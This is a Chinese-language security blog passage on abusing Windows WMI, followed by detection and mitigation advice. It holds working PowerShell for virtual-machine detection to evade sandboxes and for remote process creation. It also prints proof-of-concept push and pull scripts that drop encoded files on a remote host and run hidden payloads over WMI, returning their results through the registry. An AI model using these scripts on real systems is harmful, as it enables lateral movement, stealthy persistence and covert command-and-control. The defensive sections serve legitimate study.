<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_ComputerSystem <span class="keyword">WHERE</span> TotalPhysicalMemory <span class="operator">&lt;</span> <span class="number">2147483648</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_ComputerSystem <span class="keyword">WHERE</span> NumberOFLogicalProcessors <span class="operator">&lt;</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>命令的例子：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMDetected = <span class="variable">$False</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Arguments = @&#123;</span></span><br><span class="line">	Class = &#x27;Win32_ComputerSystem&#x27;</span><br><span class="line">	Filter = &#x27;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Get-WmiObject @Arguments) &#123;$VMDetected = $True&#125;</span><br></pre></td></tr></table></figure>

<h4 id="虚拟机检测"><a href="#虚拟机检测" class="headerlink" title="虚拟机检测"></a>虚拟机检测</h4><p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_NetworkAdapter <span class="keyword">WHERE</span> Manufacturer <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_BIOS <span class="keyword">WHERE</span> SerialNumber <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_Process <span class="keyword">WHERE</span> Name<span class="operator">=</span>&quot;vmtoolsd.exe&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_NetworkAdapter <span class="keyword">WHERE</span> Name <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br></pre></td></tr></table></figure>

<p>命名举例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMwareDetected = <span class="variable">$False</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter <span class="string">&#x27;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMBios = Get-WmiObject Win32_BIOS -Filter <span class="string">&#x27;SerialNumber Like &quot;%VMware%&quot;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMToolsRunning = Get-WmiObject Win32_Process -Filter <span class="string">&#x27;Name=&quot;vmtoolsd.exe&quot;&#x27;</span></span></span><br><span class="line"></span><br><span class="line">if ($VMAdapter  -or $VMBios -or $VMToolsRunning) &#123;$VMwareDetected = $True&#125;</span><br></pre></td></tr></table></figure>

<h4 id="代码执行和横向移动"><a href="#代码执行和横向移动" class="headerlink" title="代码执行和横向移动"></a>代码执行和横向移动</h4><p>通过WMI进行远程代码执行通常有两种方法：</p>
<h5 id="Win32-Process-Create方法"><a href="#Win32-Process-Create方法" class="headerlink" title="Win32_Process Create方法"></a>Win32_Process Create方法</h5><p><code>Win32_Process</code>类中有一个静态方法<code>Create</code>，可以本地或远程调用一个进程。这种方法与<code>psexec</code>相似。下面是一个远程执行的例子：攻击者一般会选择通过Win32_Process的Create方法来执行恶意的编码后的PowerShell命令。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Michael&gt; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &#x27;notepad.exe&#x27; -ComputerName win -C</span><br><span class="line">redential &#x27;win\Michael&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS          : 2</span><br><span class="line">__CLASS          : __PARAMETERS</span><br><span class="line">__SUPERCLASS     :</span><br><span class="line">__DYNASTY        : __PARAMETERS</span><br><span class="line">__RELPATH        :</span><br><span class="line">__PROPERTY_COUNT : 2</span><br><span class="line">__DERIVATION     : &#123;&#125;</span><br><span class="line">__SERVER         :</span><br><span class="line">__NAMESPACE      :</span><br><span class="line">__PATH           :</span><br><span class="line">ProcessId        : 3204</span><br><span class="line">ReturnValue      : 0</span><br><span class="line">PSComputerName   :</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="利用Event-处理"><a href="#利用Event-处理" class="headerlink" title="利用Event 处理"></a>利用Event 处理</h5><p>另外一种任意代码执行的方法是通过创建一个永久性WMI事件订阅。永久性WMI事件订阅通常被用来保持对特定事件的响应。如果攻击者想要执行一个程序的话，相应的事件处理就会从删除原来的事件过滤器、处理操作以及过滤器与处理操作的绑定。这种方法的优势是恶意程序以<code>SYSTEM</code>权限执行，避开了在文件中直接显示要执行的代码。比如，如果选择用一个VBScript的ActiveScriptEventConsumer恶意代码的话，只会启动WMI脚本宿主进程：<br><code>%SystemRoot%\system32\wbem\scrcons.exe -Embedding</code></p>
<p>对于攻击者，利用这种攻击的难度是要选择一个比较好的事件过滤器。如果想在几秒钟后执行程序，可以选择<code>__IntervalTimerInstruction</code>类。如果想在用户锁屏的时候执行，可以使用<code>Win32_ProcessStartTrace</code>类的<code>Extrinsic Event</code>（当<code>LogonUI.exe</code>进程创建时）。攻击者的利用方式是多种多样的。</p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><h4 id="隐秘存储"><a href="#隐秘存储" class="headerlink" title="隐秘存储"></a>隐秘存储</h4><p>攻击者会巧妙的利用WMI库来存储数据。通过动态创建一个WMI类并把数据放在该类中的静态属性的方法可以达到这样的效果。比如下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass = New-Object Management.ManagementClass(<span class="string">&#x27;root\cimv2&#x27;</span>, <span class="variable">$null</span>, <span class="variable">$null</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Name = <span class="string">&#x27;Win32_EvilClass&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Put()</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Properties.Add(<span class="string">&#x27;EvilProperty&#x27;</span>, <span class="string">&quot;This is not the malware you&#x27;re looking for&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Put()</span></span><br></pre></td></tr></table></figure>

<p>远程创建WMI类也是可以的。另外，这些隐藏起来的数据也可以很容易地通过WMI获得。<br>至于怎样去使用这些数据，就看攻击者的了。下面的一些实际的代码展示了这种攻击的方法。</p>
<h4 id="利用WMI做C2"><a href="#利用WMI做C2" class="headerlink" title="利用WMI做C2"></a>利用WMI做C2</h4><p>通过使用WMI的方法来保存和读取数据，可以构造出一个C2（Command &amp; Control）来。这种方法由<a target="_blank" rel="noopener" href="http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf" title="Andrei Dumitrescu公布">Andrei Dumitrescu公布</a>Andrei Dumitrescu公布。除了我们讨论的方法，还有别的，比如利用注册表来存储数据等。下面是一些利用WMI在POC代码。</p>
<h5 id="Push攻击"><a href="#Push攻击" class="headerlink" title="Push攻击"></a>Push攻击</h5><p>这个例子展示了如何通过远程创建WMI类来存储数据。这些数据会被远程的<code>powershell.exe</code>执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prep file to drop on remote system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">LocalFilePath = <span class="string">&#x27;C:\Users\ht\Documents\evidence_to_plant.png&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">FileBytes = [IO.File]::ReadAllBytes(<span class="variable">$LocalFilePath</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EncodedFileContentsToDrop = [Convert]::ToBase64String(<span class="variable">$FileBytes</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Establish remote WMI connection</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options = New-Object Management.ConnectionOptions</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.Username = <span class="string">&#x27;Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.Password = <span class="string">&#x27;user&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.EnablePrivileges = <span class="variable">$True</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection = New-Object Management.ManagementScope</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Path = <span class="string">&#x27;\192.168.72.134\root\default&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Options = <span class="variable">$Options</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Connect()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Push file contents</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass = New-Object Management.ManagementClass(<span class="variable">$Connection</span>, [String]::Empty, <span class="variable">$null</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass[<span class="string">&#x27;__CLASS&#x27;</span>] = <span class="string">&#x27;Win32_EvilClass&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Properties.Add(<span class="string">&#x27;EvilProperty&#x27;</span>, [Management.CimType]::String, <span class="variable">$False</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Properties[<span class="string">&#x27;EvilProperty&#x27;</span>].Value = <span class="variable">$EncodedFileContentsToDrop</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Put()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Credential = Get-Credential <span class="string">&#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CommonArgs = @&#123;</span></span><br><span class="line">	Credential = $Credential</span><br><span class="line">	ComputerName = &#x27;192.168.72.134&#x27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The PowerShell payload that will drop to stored file contents</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">PayloadText = @<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedFile = ([WmiClass] &#x27;</span>root\default:Win32_EvilClass<span class="string">&#x27;).Properties[&#x27;</span>EvilProperty<span class="string">&#x27;].Value</span></span></span><br><span class="line">[IO.File]::WriteAllBytes(&#x27;C:\fighter_jet_specs.png&#x27;, [Convert]::FromBase64String($EncodedFile))</span><br><span class="line">[Convert]::FromBase64String($EncodedFile))</span><br><span class="line">&#x27;@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedPayload =[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Drop the file to the target filesystem</span></span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Confirm successful file drop</span></span></span><br><span class="line">Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter &#x27;Name =</span><br><span class="line">&quot;C:\\fighter_jet_specs.png&quot;&#x27;</span><br></pre></td></tr></table></figure>


<h5 id="Pull攻击"><a href="#Pull攻击" class="headerlink" title="Pull攻击"></a>Pull攻击</h5><p>下面的例子展示了如何通过注册表来等到PowerShell命令执行的结果。另外，许多恶意程序在获取PowerShell命令结果时都仅仅将结果以明文方式获取，这个例子使用了PowerShell对象的序列化和反序列化来获取富文本信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Credential = Get-Credential <span class="string">&#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CommonArgs = @&#123;</span></span><br><span class="line">	Credential = $Credential</span><br><span class="line">	ComputerName = &#x27;192.168.72.131&#x27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create a remote registry key and value</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HKLM = 2147483650</span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, &#x27;SOFTWARE\EvilKey&#x27;</span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name DeleteValue -ArgumentList $HKLM, &#x27;SOFTWARE\EvilKey&#x27;, &#x27;Result&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PowerShell payload that saves the serialized output of `Get-Process lsass` to the registry</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">PayloadText = @<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Payload = &#123;Get-Process lsass&#125;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Result = &amp; $Payload</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Output))</span></span></span><br><span class="line">Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value $Encoded</span><br><span class="line">&#x27;@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedPayload =[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Invoke PowerShell payload</span></span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Pull the serialized results back</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">RemoteOutput = Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name GetStringValue -ArgumentList $HKLM, &#x27;</span>SOFTWARE\EvilKey<span class="string">&#x27;, &#x27;</span>Result<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedOutput = $RemoteOutput.sValue</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Deserialize and display the result of the command executed on the remote system</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">DeserializedOutput =[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($EncodedOutput)))</span></span></span><br></pre></td></tr></table></figure>

<h2 id="WMI-Providers（提供者）"><a href="#WMI-Providers（提供者）" class="headerlink" title="WMI Providers（提供者）"></a>WMI Providers（提供者）</h2><p>WMI提供者是WMI的主干。几乎所有的WMI类及其提供的方法都是通过提供者实现的。一个提供者就是一个用户态下的<code>COM DLL</code>或内核驱动。每一个提供者都在注册表中有对应的<code>CLSID</code>，用来做<code>COM Resolution</code>COM的方案。所有的注册的提供者都有与之相应的<code>__Win32Provider</code>的一个WMI类。例如，下面是来用处理注册表操作的已注册的WMI提供者：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PSComputerName   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Michael&gt; Get-CimInstance -Namespace root\cimv2 -ClassName __Win32Provider -Filter &#x27;Name=&quot;RegistryEventProvid</span><br><span class="line">er&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name                          : RegistryEventProvider</span><br><span class="line">ClientLoadableCLSID           :</span><br><span class="line">CLSID                         : &#123;fa77a74e-e109-11d0-ad6e-00c04fd8fdff&#125;</span><br><span class="line">Concurrency                   :</span><br><span class="line">DefaultMachineName            :</span><br><span class="line">Enabled                       :</span><br><span class="line">HostingModel                  : LocalSystemHost</span><br><span class="line">ImpersonationLevel            : 0</span><br><span class="line">InitializationReentrancy      : 0</span><br><span class="line">InitializationTimeoutInterval :</span><br><span class="line">InitializeAsAdminFirst        :</span><br><span class="line">OperationTimeoutInterval      :</span><br><span class="line">PerLocaleInitialization       : False</span><br><span class="line">PerUserInitialization         : False</span><br><span class="line">Pure                          : True</span><br><span class="line">SecurityDescriptor            :</span><br><span class="line">SupportsExplicitShutdown      :</span><br><span class="line">SupportsExtendedStatus        :</span><br><span class="line">SupportsQuotas                :</span><br><span class="line">SupportsSendStatus            :</span><br><span class="line">SupportsShutdown              :</span><br><span class="line">SupportsThrottling            :</span><br><span class="line">UnloadTimeout                 :</span><br><span class="line">Version                       :</span><br><span class="line">PSComputerName                :</span><br></pre></td></tr></table></figure>

<p>可以通过查看下面的注册表值来找到与<code>RegistryEventProvider</code>提供者相关的DLL文件：<br><code>HKEY_CLASSES_ROOT\CLSID\&#123;fa77a74e-e109-11d0-ad6e-00c04fd8fdff&#125;\InprocServer32 - (Default)</code></p>
<p>使用PowerShell可以枚举已注册的提供者的DLL信息。</p>
<h3 id="恶意WMI-Providers（提供者）"><a href="#恶意WMI-Providers（提供者）" class="headerlink" title="恶意WMI Providers（提供者）"></a>恶意WMI Providers（提供者）</h3><p>就像合法的WMI提供者可以为用户提供一些功能一样，恶意的WMI提供者也可以被用来拓展WMI的功能。</p>
<p>Casey和Jared Atkinson都给分享了一些利用恶意WMI提供者来执行代码的PowerShell脚本的例子。<br>[EvilWMIProvider][1]<br>[1]: <a target="_blank" rel="noopener" href="https://github.com/subTee/EvilWMIProvider">https://github.com/subTee/EvilWMIProvider</a> “<a target="_blank" rel="noopener" href="https://github.com/subTee/EvilWMIProvider&quot;">https://github.com/subTee/EvilWMIProvider&quot;</a><br>[EvilNetConnectionWMIProvider][2]<br>[2]:<a target="_blank" rel="noopener" href="https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider">https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider</a></p>
<h2 id="WMI-防御"><a href="#WMI-防御" class="headerlink" title="WMI 防御"></a>WMI 防御</h2><h3 id="已有的检测工具"><a href="#已有的检测工具" class="headerlink" title="已有的检测工具"></a>已有的检测工具</h3><ul>
<li>Sysinternals Autoruns：传送门<a href="http://m0nst3r.me/web-sec/290.html" title="透过Autoruns看持久化绕过姿势的分享">透过Autoruns看持久化绕过姿势的分享</a><br>*<a target="_blank" rel="noopener" href="https://github.com/davehull/Kansa/" title=" Kansa"> Kansa</a>: 一个用来做应急响应的PowerShell模块</li>
</ul>
<p>使用这些工具的不好之处就是它们只能检测到在某个时间 点上的WMI持久化。一些攻击者会在完成操作之后将持久化代码清除。当然，使用永久性WMI订阅来对付攻击者也能让我们即时抓住使用WMI做的持久化行为。</p>
<p>检测WMI持久化行为也不难。下面的PowerShell脚本就可以查询远程系统中所有的持久化的项。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Arguments = @&#123;</span></span><br><span class="line">	Credential = &#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span><br><span class="line">	ComputerName = &#x27;192.168.72.135&#x27;</span><br><span class="line">	Namespace = &#x27;root\subscription&#x27;</span><br><span class="line">&#125;</span><br><span class="line">Get-WmiObject -Class __FilterToConsumerBinding @Arguments</span><br><span class="line">Get-WmiObject -Class __EventFilter @Arguments</span><br><span class="line">Get-WmiObject -Class __EventConsumer @Arguments</span><br></pre></td></tr></table></figure>

<h3 id="利用WMI检测WMI攻击"><a href="#利用WMI检测WMI攻击" class="headerlink" title="利用WMI检测WMI攻击"></a>利用WMI检测WMI攻击</h3><p>通过WMI提供的强大的事件系统，WMI可以被当作Microsoft免费提供给我们的IDS。由于基本所有的系统行为都可以引发一个WMI事件，所以WMI的确可以用来检测攻击行为。下面列举几个应对方法：</p>
<ul>
<li><p>攻击者使用WMI做持久化时：</p>
</li>
<li><p><code>__EventFilter</code>、<code>__EventConsumer</code>和<code>__FilterToConsumerBinding</code>的实例会被创建。一个<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
<li><p>当WMI被用做C2时：</p>
</li>
<li><p><code>__Namespace</code>对象实例会被创建和修改，结果是<code>__NamespaceCreationEvent</code>和<code>__NamespaceModificationEvent</code>事件被触发。</p>
</li>
<li><p>通过WMI类存储数据时：</p>
<ul>
<li><code>__ClassCreationEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>攻击者安装WMI提供者时：</p>
<ul>
<li>一个<code>__Provider</code>类的实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>攻击者使用开始菜单或注册表做持久化时：</p>
</li>
<li><p>一个<code>Win32_StartupCommand</code>类的实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
<li><p>攻击者使用其它注册表值做持久化时：</p>
<ul>
<li><code>RegistrykeyChangeEvent</code>或<code>RegistryValueChangeEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>当攻击者安装服务时：</p>
</li>
<li><p>一个<code>Win32_Service</code>实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
</ul>
<p>所有的攻击行为和产生的效果都可以通过WMI事件查询显示出来。把这些方法结合起来，防御者其实也可以有很大的发挥空间来应对这些攻击。</p>
<p>这些技术不好的地方就是，可以你得会使用VBScript编程，另外，对WMI攻击技术比较了解的人来说，它们可以在攻击之前会先把防御者所设置的防御措施删除。跟猫和老鼠的游戏一样。然而，删除需要管理权限，所以攻击者还是处于相对劣势的。最后作为防御者来说，还有一个好的办法防止攻击者删除我们的事件订阅，那就是注册并订阅<code>__EventFilter</code>、<code>__EventConsumer</code>和<code>__FilterToConsumerBinding</code>对象的<code>__InstanceDeletionEvent</code>事件。</p>
<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>除了设置防御性的WMI事件订阅，还有一些其他缓解措施：</p>
<ul>
<li>考虑禁用WMI服务。不过Windows系统越来越多的依赖WMI和WinRM来管理，禁用时务必弄清影响范围及可行性。</li>
<li>考虑限制WMI协议端口。如果不需要远程使用WMI的话，可以把DCOM配置为单端口并限制该端口。这个比禁用WMI更实际一些。</li>
<li>WMI、DCOM和WinRM事件的事件日志保存在：</li>
<li>Microsoft-Windows-WinRM&#x2F;Operational</li>
<li>Microsoft-Windows-WMI-Activity&#x2F;Operational</li>
<li>Microsoft-Windows-DistributedCom</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/pentest/%E9%80%8F%E8%BF%87Autoruns%E7%9C%8B%E6%8C%81%E4%B9%85%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%88%86%E4%BA%AB.html" rel="prev" title="透过Autoruns看持久化绕过姿势的分享">
                  <i class="fa fa-chevron-left"></i> 透过Autoruns看持久化绕过姿势的分享
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/pentest/%E5%88%A9%E7%94%A8INF%20Script%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E5%85%8D%E6%9D%80%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96.html" rel="next" title="利用INF Script下载执行技术来进行绕过，免杀和持久化">
                  利用INF Script下载执行技术来进行绕过，免杀和持久化 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
